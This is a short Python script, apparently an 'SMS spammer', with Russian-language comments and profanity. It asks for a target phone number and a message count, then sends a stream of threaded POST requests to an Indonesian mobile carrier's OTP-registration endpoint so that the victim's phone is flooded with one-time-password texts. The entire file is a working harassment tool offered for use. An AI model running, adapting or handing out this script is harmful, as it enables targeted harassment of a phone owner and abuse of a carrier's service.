#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by mrb12in
"""Khromav lox
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nНадо доустановить кое-что")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
     _  _
   _| || |_  \033[1;32mSMS SPAMER (UPDATE)\033[1;36m
  |_  ..  _|
  |_      _| \033[1;31mContact=>https://vk.com/mrb12in\033[1;36m
    |_||_|   \033[1;31mGithub=>https://github.com/mrb12in
""")

os.system('clear')
print(banner)
no = input("\033[1;37m Target Number =>\033[1;32m")
tot = int(input("\033[1;37mMessage Spam =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUCCESS(РАботает ебать)")
		else:
			print("\033[1;31m[-] У сука сервис пизды дал")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
